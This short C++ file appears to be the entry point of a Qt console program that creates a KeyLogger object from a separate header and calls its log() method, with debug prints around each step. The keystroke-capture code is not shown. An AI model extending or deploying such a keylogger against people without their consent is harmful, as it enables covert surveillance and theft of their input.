#include <QCoreApplication>
#include <QDebug>
#include "key_logger.h"

int main(int argc, char* argv[]) {
  QCoreApplication a(argc, argv);
  qDebug() << "app started";
  qDebug() << "create kl class";
  KeyLogger kl;
  qDebug() << "try to log";
  kl.log();
  qDebug() << "end log";
  return a.exec();
}
